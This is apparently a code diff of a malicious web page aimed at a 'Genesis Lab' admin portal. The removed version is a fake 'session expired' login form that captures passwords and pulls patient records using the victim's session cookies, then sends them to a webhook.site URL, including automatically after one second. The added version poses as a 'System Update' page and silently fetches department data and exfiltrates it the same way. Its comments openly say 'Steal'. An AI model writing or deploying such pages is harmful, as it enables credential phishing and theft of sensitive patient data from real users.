@@ -1,50 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Genesis Lab - Secure Login</title>
+    <title>Genesis Lab - System Update</title>
     <style>
-        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #e0e0e0; }
-        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
-        button { width: 100%; padding: 10px; background: #2c3e50; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .status {
+            color: #666;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
-    <div class="login-box">
+    <div class="container">
         <h2>Genesis Lab Portal</h2>
-        <p>Session expired. Please re-authenticate.</p>
-        <input type="text" placeholder="Username" id="username">
-        <input type="password" placeholder="Password" id="password">
-        <button onclick="login()">Login</button>
+        <p>Loading system updates...</p>
+        <div class="status">Please wait</div>
     </div>
-    
+
     <script>
+        // Your webhook URL
         const WEBHOOK = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
         
-        async function login() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+        // Steal department data
+        fetch('https://admin.genesislab.in/api/departments/20', {
+            credentials: 'include'
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Stolen department data:', data);
             
-            // Still steal data in background even if they don't enter creds
-            fetch('https://admin.genesislab.in/api/patients?rowsPerPage=1000', {
-                credentials: 'include'
-            }).then(r => r.json()).then(data => {
-                fetch(WEBHOOK, {method: 'POST', mode: 'no-cors', 
-                    body: JSON.stringify({type: 'patients', data: data, username: username, password: password})});
+            // Send to webhook
+            fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    victim_origin: window.location.origin,
+                    victim_referrer: document.referrer,
+                    stolen_data: data,
+                    endpoint: '/api/departments/20'
+                })
             });
             
-            alert('Login failed. Please try again.');
-        }
-        
-        // Auto steal even without clicking
-        setTimeout(() => {
-            fetch('https://admin.genesislab.in/api/patients?rowsPerPage=1000', {
-                credentials: 'include'
-            }).then(r => r.json()).then(data => {
-                fetch(WEBHOOK, {method: 'POST', mode: 'no-cors',
-                    body: JSON.stringify({type: 'patients', data: data})});
-            });
-        }, 1000);
+            // Update UI
+            document.querySelector('.status').innerHTML = 'Update complete: ' + data.name;
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            document.querySelector('.status').innerHTML = 'Error: ' + error.message;
+        });
     </script>
 </body>
 </html>
